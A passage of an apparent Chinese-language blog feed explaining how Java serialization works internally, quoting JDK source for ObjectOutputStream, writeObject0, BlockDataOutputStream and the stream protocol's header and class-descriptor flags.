class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里其实需要考虑<code>writeObjectMethod</code>这个属性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** class-defined writeObject method, or null if none */</span></span><br><span class="line"><span class="keyword">private</span> Method writeObjectMethod;</span><br></pre></td></tr></table></figure><p>这个属性本身类型就是<code>java.lang.reflect.Method</code>，属于反射的作用范围。</p><p>找了一圈发现，在<code>ObjectStreamClass</code>类的构造函数里面就有一句：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">writeObjectMethod = getPrivateMethod(cl, <span class="string">"writeObject"</span>,</span><br><span class="line">                    <span class="keyword">new</span> Class&lt;?&gt;[] &#123; ObjectOutputStream<span class="class">.<span class="keyword">class</span> &#125;,</span></span><br><span class="line"><span class="class">                    <span class="title">Void</span>.<span class="title">TYPE</span>)</span>;</span><br><span class="line">readObjectMethod = getPrivateMethod(cl, <span class="string">"readObject"</span>,</span><br><span class="line">                    <span class="keyword">new</span> Class&lt;?&gt;[] &#123; ObjectInputStream<span class="class">.<span class="keyword">class</span> &#125;,</span></span><br><span class="line"><span class="class">                    <span class="title">Void</span>.<span class="title">TYPE</span>)</span>;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>所以在这里，已经判断了这个类是否存在<code>writeObject</code>方法，同时也寻找了<code>readObject</code>方法。</p><p>如果<code>writeObejct</code>存在的话就封装为<code>Method</code>，赋值给<code>writeObjectMethod</code>属性。</p><p>细心的你应该也能发现，这里对<code>writeObject</code>做了限制：</p><ul><li>参数必须为ObjectOutputStream类型</li><li>返回值必须为void</li><li>必须为 private</li><li>非static</li></ul><p>到这里我们解答了第二个问题，并且知道，如果你要实现writeObject必须要形式如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream oos)</span></span>&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那现在就写一个：</p><img src="../images/Java%E5%AF%B9%E8%B1%A1%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E5%8D%8F%E8%AE%AE%E6%A2%B3%E7%90%86/image-20210716202716995.png" alt="image-20210716202716995" style="zoom:50%;"><p>我们在<code>writeObject</code>方法内部只是调用defaultWriteObject()方法写入对象字段数据。</p><p>再看一遍：</p><p><img src="../images/Java%E5%AF%B9%E8%B1%A1%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E5%8D%8F%E8%AE%AE%E6%A2%B3%E7%90%86/image-20210716203132016.png" alt="image-20210716203132016"></p><p>可以发现在最后面多了一块：</p><img src="../images/Java%E5%AF%B9%E8%B1%A1%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E5%8D%8F%E8%AE%AE%E6%A2%B3%E7%90%86/image-20210717101423353.png" alt="image-20210717101423353" style="zoom:50%;"><p>并且在前面多了一块：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">classDescFlags - <span class="number">0x03</span> - SC_WRITE_METHOD | SC_SERIALIZABLE</span><br></pre></td></tr></table></figure><p>表明当前对象的类是有<code>writeObject</code>方法的</p><p>由于<code>annotateClass()</code>方法默认为空，所以<code>objectAnnotations</code>后一般会设置<code>TC_ENDBLOCKDATA</code>标识；</p><p>如果我们自己的<code>writeObject</code>不仅仅是<code>defaultWriteObject</code>：</p><img src="../images/Java%E5%AF%B9%E8%B1%A1%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E5%8D%8F%E8%AE%AE%E6%A2%B3%E7%90%86/image-20210717101958948.png" alt="image-20210717101958948" style="zoom:50%;"><p>对比看区别：</p><p><img src="../images/Java%E5%AF%B9%E8%B1%A1%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E5%8D%8F%E8%AE%AE%E6%A2%B3%E7%90%86/image-20210717101937318.png" alt="image-20210717101937318"></p><p>在classdata部分又多出来了一些内容，也就是写入了自定义数据，</p><p><code>blockdata</code>表示下面的就是一个数据块，因为我们往里存放的是一个整数<code>666</code>，所以长度为int类型的长度4，contents内容就是16进制的666。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.cnpanda.net/talksafe/892.html" target="_blank" rel="noopener">panda</a></p><p><a href="https://xz.aliyun.com/t/8686" target="_blank" rel="noopener">xz.aliyun.com</a></p><p><a href="https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html" target="_blank" rel="noopener">Object Serialization Stream Protocol</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;序言&quot;&gt;&lt;a href=&quot;#序言&quot; class=&quot;headerlink&quot; title=&quot;序言&quot;&gt;&lt;/a&gt;序言&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;浮云游子意，落日故人情。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;协议原文&lt;a href=&quot;https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Object Serialization Stream Protocol&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Java" scheme="https://0range228.github.io/categories/Java/"/>
    
    
      <category term="Java序列化原理" scheme="https://0range228.github.io/tags/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>Java序列化流程梳理</title>
    <link href="https://0range228.github.io/Java%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E6%A2%B3%E7%90%86/"/>
    <id>https://0range228.github.io/Java%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E6%A2%B3%E7%90%86/</id>
    <published>2021-07-15T11:37:36.000Z</published>
    <updated>2021-07-17T05:29:49.090Z</updated>
    
    <content type="html"><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote><p>浮云游子意，落日故人情。</p></blockquote><p>梳理Java序列化流程。</p><p>参考<a href="https://www.cnpanda.net/" target="_blank" rel="noopener">panda</a>师傅。</p><a id="more"></a><h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>Java序列化就是将对象写入到I/O流之中，通常输出格式为<code>.ser</code>文件。</p><p>简单说首先创建一个<code>ObjectOutputStream</code>输出流对象，然后调用<code>ObjectOutputStream</code>对象的<code>writeObject</code>方法，按照规范格式输出可序列化对象。</p><h1 id="具体流程"><a href="#具体流程" class="headerlink" title="具体流程"></a>具体流程</h1><p>接下来一步一步走，消化一遍<a href="https://www.cnpanda.net/sec/893.html" target="_blank" rel="noopener">panda</a>师傅的文章。</p><p>例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Serialize</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> String string;</span><br><span class="line">        <span class="keyword">transient</span> String name = <span class="string">"hello"</span>;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Demo</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.string = s;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">            Demo demo = <span class="keyword">new</span> Demo(<span class="string">"panda"</span>);</span><br><span class="line">            ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"panda.out"</span>));</span><br><span class="line">            outputStream.writeObject(<span class="keyword">new</span> Demo(<span class="string">"panda"</span>));</span><br><span class="line">            outputStream.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="构造函数"><a href="#构造函数" class="headerlink" title="构造函数"></a>构造函数</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ObjectOutputStream outputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"panda.out"</span>));</span><br><span class="line">outputStream.writeObject(<span class="keyword">new</span> Demo(<span class="string">"panda"</span>));</span><br></pre></td></tr></table></figure><p>首先来到<code>public ObjectOutputStream(OutputStream out)</code>构造函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* 创建写入指定输出流的ObjectOutputStream。</span></span><br><span class="line"><span class="comment">* 此构造函数将序列化流头写入底层流；</span></span><br><span class="line"><span class="comment">* 调用者可能希望立即刷新流，以确保接收ObjectInputStreams的构造函数在读取头时不会阻塞。</span></span><br><span class="line"><span class="comment">* 如果安装了安全管理器，则当重写ObjectOutputStream.putFields或ObjectOutputStream.writeUnshared方法的子类的构造函数直接或间接调用时，此构造函数将检查“enableSublassimplementation”SerializablePermission。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ObjectOutputStream</span><span class="params">(OutputStream out)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    verifySubclass();</span><br><span class="line">    bout = <span class="keyword">new</span> BlockDataOutputStream(out);</span><br><span class="line">    handles = <span class="keyword">new</span> HandleTable(<span class="number">10</span>, (<span class="keyword">float</span>) <span class="number">3.00</span>);</span><br><span class="line">    subs = <span class="keyword">new</span> ReplaceTable(<span class="number">10</span>, (<span class="keyword">float</span>) <span class="number">3.00</span>);</span><br><span class="line">    enableOverride = <span class="keyword">false</span>;</span><br><span class="line">    writeStreamHeader();</span><br><span class="line">    bout.setBlockDataMode(<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (extendedDebugInfo) &#123;</span><br><span class="line">        debugInfoStack = <span class="keyword">new</span> DebugTraceInfoStack();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        debugInfoStack = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一头雾水，接下来一步一步梳理：</p><p><code>verifySubclass()</code>方法:</p><blockquote><p>验证本类（或其子类）实例可以在不违反安全约束的情况下被构造出来。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">verifySubclass</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Class&lt;?&gt; cl = getClass();</span><br><span class="line">    <span class="comment">//如果构造的不是ObjectOutputStream的子类则直接返回</span></span><br><span class="line">    <span class="keyword">if</span> (cl == ObjectOutputStream<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">        <span class="title">return</span></span>;</span><br><span class="line">    <span class="comment">//否则获取安全管理器检查是否有继承ObjectOutputStream的权限</span></span><br><span class="line">    SecurityManager sm = System.getSecurityManager();</span><br><span class="line">    <span class="keyword">if</span> (sm == <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">//移除Caches中已经失去引用的Class对象</span></span><br><span class="line">    processQueue(Caches.subclassAuditsQueue, Caches.subclassAudits);</span><br><span class="line">    <span class="comment">//将ObjectOutputStream的子类存入Caches</span></span><br><span class="line">    WeakClassKey key = <span class="keyword">new</span> WeakClassKey(cl, Caches.subclassAuditsQueue);</span><br><span class="line"> </span><br><span class="line">    Boolean result = Caches.subclassAudits.get(key);</span><br><span class="line">    <span class="keyword">if</span> (result == <span class="keyword">null</span>) &#123;</span><br><span class="line">        result = Boolean.valueOf(auditSubclass(cl));</span><br><span class="line">        Caches.subclassAudits.putIfAbsent(key, result);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (result.booleanValue())</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">//如果没有权限则抛出SecurityException异常</span></span><br><span class="line">    sm.checkPermission(SUBCLASS_IMPLEMENTATION_PERMISSION);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来可以看到对<code>bout,handles,subs,enableOverride</code>一些成员变量进行了复制，跳到他们的声明处看一看：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** filter stream for handling block data conversion */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> BlockDataOutputStream bout;</span><br><span class="line"><span class="comment">/** obj -&gt; wire handle map */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> HandleTable handles;</span><br><span class="line"><span class="comment">/** obj -&gt; replacement obj map */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> ReplaceTable subs;</span><br><span class="line"><span class="comment">/** stream protocol version */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> protocol = PROTOCOL_VERSION_2;</span><br><span class="line"><span class="comment">/** recursion depth */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> depth;</span><br><span class="line"><span class="comment">/** buffer for writing primitive field values */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">byte</span>[] primVals;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** if true, invoke writeObjectOverride() instead of writeObject() */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">boolean</span> enableOverride;</span><br><span class="line"><span class="comment">/** if true, invoke replaceObject() */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">boolean</span> enableReplace;</span><br></pre></td></tr></table></figure><p>重点挑这几个说：</p><ul><li>bout：用来处理数据块转换的数据流，理解为一个容器</li><li>handles ：对象-&gt;handle引用</li><li>subs:  对象-&gt;替换对象</li><li>enableOverride：布尔值 用来决定在序列化Java对象时选用<code>writeObjectOverride</code>方法还是<code>writeObject</code>方法 通常为false</li></ul><p>关于 handles 的作用，举个例子，<strong>我们知道 Java 序列化除了保存字段信息外，还保存有类信息</strong>，当同一个对象序列化两次时第二次只用保存第一次的编号，这样可以大大减少序列化文件的大小。</p><p>你肯定对第一个bout的理解有些别扭。</p><p>开启支线任务，什么是<strong>BlockDataOutputStream</strong>？</p><h3 id="BlockDataOutputStream"><a href="#BlockDataOutputStream" class="headerlink" title="BlockDataOutputStream"></a>BlockDataOutputStream</h3><p><code>BlockDataOutputStream</code>是<code>ObjectOutputStream</code>的一个重要内部类，<strong>这个类负责将缓冲区中的数据写入到字节流</strong>。</p><p>该类部分内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line">     * Buffered output stream with two modes: in default mode, outputs data in</span><br><span class="line">     * same format as DataOutputStream; in &quot;block data&quot; mode, outputs data</span><br><span class="line">     * bracketed by block data markers (see object serialization specification</span><br><span class="line">     * for details).</span><br><span class="line">     *&#x2F;</span><br><span class="line">private static class BlockDataOutputStream extends OutputStream implements DataOutput</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;** maximum data block length *&#x2F;</span><br><span class="line">    private static final int MAX_BLOCK_SIZE &#x3D; 1024;</span><br><span class="line">    &#x2F;** maximum data block header length *&#x2F;</span><br><span class="line">    private static final int MAX_HEADER_SIZE &#x3D; 5;</span><br><span class="line">    &#x2F;** (tunable) length of char buffer (for writing strings) *&#x2F;</span><br><span class="line">    private static final int CHAR_BUF_SIZE &#x3D; 256;</span><br><span class="line"></span><br><span class="line">    &#x2F;** buffer for writing general&#x2F;block data *&#x2F;</span><br><span class="line">    private final byte[] buf &#x3D; new byte[MAX_BLOCK_SIZE];</span><br><span class="line">    &#x2F;** buffer for writing block data headers *&#x2F;</span><br><span class="line">    private final byte[] hbuf &#x3D; new byte[MAX_HEADER_SIZE];</span><br><span class="line">    &#x2F;** char buffer for fast string writes *&#x2F;</span><br><span class="line">    private final char[] cbuf &#x3D; new char[CHAR_BUF_SIZE];</span><br><span class="line"></span><br><span class="line">    &#x2F;** block data mode *&#x2F;</span><br><span class="line">    private boolean blkmode &#x3D; false;</span><br><span class="line">    &#x2F;** current offset into buf *&#x2F;</span><br><span class="line">    private int pos &#x3D; 0;</span><br><span class="line"></span><br><span class="line">    &#x2F;** underlying output stream *&#x2F;</span><br><span class="line">    private final OutputStream out;</span><br><span class="line">    &#x2F;** loopback stream (for data writes that span data blocks) *&#x2F;</span><br><span class="line">    private final DataOutputStream dout;</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * Creates new BlockDataOutputStream on top of given underlying stream.</span><br><span class="line">     * Block data mode is turned off by default.</span><br><span class="line">     *&#x2F;</span><br><span class="line">    BlockDataOutputStream(OutputStream out) &#123;</span><br><span class="line">        this.out &#x3D; out;</span><br><span class="line">        dout &#x3D; new DataOutputStream(this);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大致意思就是：</p><blockquote><p>缓冲输出流有两种模式：</p><p>在默认模式下，以与DataOutputStream相同的格式输出数据；</p><p>在 “块数据 “模式下，输出数据 在 “块数据 “模式下，输出由块数据标记括起来的数据 – 详见对象序列化规范。</p><p>可以理解成<code>BlockDataOutputStream</code>类是封装后的<code>DataOutputStream</code>类，并且提供了一些缓冲区及成员属性。</p></blockquote><p>在给这些成员变量赋值结束之后，接下来进入<code>writeStreamHeader</code>方法。</p><img src="../images/Java%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E6%A2%B3%E7%90%86/image-20210715201920550.png" alt="image-20210715201920550" style="zoom:50%;"><p>熟悉的<code>aced0005</code>出现了，可以理解为<code>bout</code>就是我们的句柄，负责缓存我们的序列化数据。</p><p>接下来是<code>bout.setBlockDataMode(true);</code> 将<code>bout</code>设置为<strong>块模式</strong></p><h2 id="核心：writeObject"><a href="#核心：writeObject" class="headerlink" title="核心：writeObject"></a>核心：writeObject</h2><p>构造函数执行结束之后，就要来到第二句话:<code>outputStream.writeObject(new Demo(&quot;panda&quot;));</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (enableOverride) &#123;</span><br><span class="line">       writeObjectOverride(obj);</span><br><span class="line">       <span class="keyword">return</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">       writeObject0(obj, <span class="keyword">false</span>);</span><br><span class="line">   &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">       <span class="keyword">if</span> (depth == <span class="number">0</span>) &#123;</span><br><span class="line">           writeFatalException(ex);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">throw</span> ex;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以说；writeObject 将所有序列委托给了 writeObject0 完成，如果序列化出现异常调用 writeFatalException 方法。</p><p>首先是<code>if(enableOverride)</code> ，这里面的<code>enableOverride</code>其实一般都是false(上一步的构造函数)，那么就直接进入到<code>writeObject0</code>方法：</p><h3 id="核中核-：writeObject0"><a href="#核中核-：writeObject0" class="headerlink" title="核中核 ：writeObject0"></a>核中核 ：writeObject0</h3><p>writeObject0 比较复杂，大致可分为三个部分：</p><ul><li>一是判断需不需要序列化；</li><li>二是判断是否替换了对象；</li><li>三是终于可以序列化。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Underlying writeObject/writeUnshared implementation.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject0</span><span class="params">(Object obj, <span class="keyword">boolean</span> unshared)</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">      <span class="keyword">boolean</span> oldMode = bout.setBlockDataMode(<span class="keyword">false</span>);</span><br><span class="line">      depth++;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          <span class="comment">// handle previously written and non-replaceable objects</span></span><br><span class="line">          <span class="keyword">int</span> h;</span><br><span class="line">          <span class="keyword">if</span> ((obj = subs.lookup(obj)) == <span class="keyword">null</span>) &#123;</span><br><span class="line">              writeNull();</span><br><span class="line">              <span class="keyword">return</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!unshared &amp;&amp; (h = handles.lookup(obj)) != -<span class="number">1</span>) &#123;</span><br><span class="line">              writeHandle(h);</span><br><span class="line">              <span class="keyword">return</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">              writeClass((Class) obj, unshared);</span><br><span class="line">              <span class="keyword">return</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ObjectStreamClass) &#123;</span><br><span class="line">              writeClassDesc((ObjectStreamClass) obj, unshared);</span><br><span class="line">              <span class="keyword">return</span>;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">// check for replacement object</span></span><br><span class="line">          Object orig = obj;</span><br><span class="line">          Class&lt;?&gt; cl = obj.getClass();</span><br><span class="line">          ObjectStreamClass desc;</span><br><span class="line">          <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">              <span class="comment">// REMIND: skip this check for strings/arrays?</span></span><br><span class="line">              Class&lt;?&gt; repCl;</span><br><span class="line">              desc = ObjectStreamClass.lookup(cl, <span class="keyword">true</span>);</span><br><span class="line">              <span class="keyword">if</span> (!desc.hasWriteReplaceMethod() ||</span><br><span class="line">                  (obj = desc.invokeWriteReplace(obj)) == <span class="keyword">null</span> ||</span><br><span class="line">                  (repCl = obj.getClass()) == cl)</span><br><span class="line">              &#123;</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              cl = repCl;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> (enableReplace) &#123;</span><br><span class="line">              Object rep = replaceObject(obj);</span><br><span class="line">              <span class="keyword">if</span> (rep != obj &amp;&amp; rep != <span class="keyword">null</span>) &#123;</span><br><span class="line">                  cl = rep.getClass();</span><br><span class="line">                  desc = ObjectStreamClass.lookup(cl, <span class="keyword">true</span>);</span><br><span class="line">              &#125;</span><br><span class="line">              obj = rep;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">// if object replaced, run through original checks a second time</span></span><br><span class="line">          <span class="keyword">if</span> (obj != orig) &#123;</span><br><span class="line">              subs.assign(orig, obj);</span><br><span class="line">              <span class="keyword">if</span> (obj == <span class="keyword">null</span>) &#123;</span><br><span class="line">                  writeNull();</span><br><span class="line">                  <span class="keyword">return</span>;</span><br><span class="line">              &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!unshared &amp;&amp; (h = handles.lookup(obj)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                  writeHandle(h);</span><br><span class="line">                  <span class="keyword">return</span>;</span><br><span class="line">              &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> Class) &#123;</span><br><span class="line">                  writeClass((Class) obj, unshared);</span><br><span class="line">                  <span class="keyword">return</span>;</span><br><span class="line">              &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> ObjectStreamClass) &#123;</span><br><span class="line">                  writeClassDesc((ObjectStreamClass) obj, unshared);</span><br><span class="line">                  <span class="keyword">return</span>;</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">// remaining cases</span></span><br><span 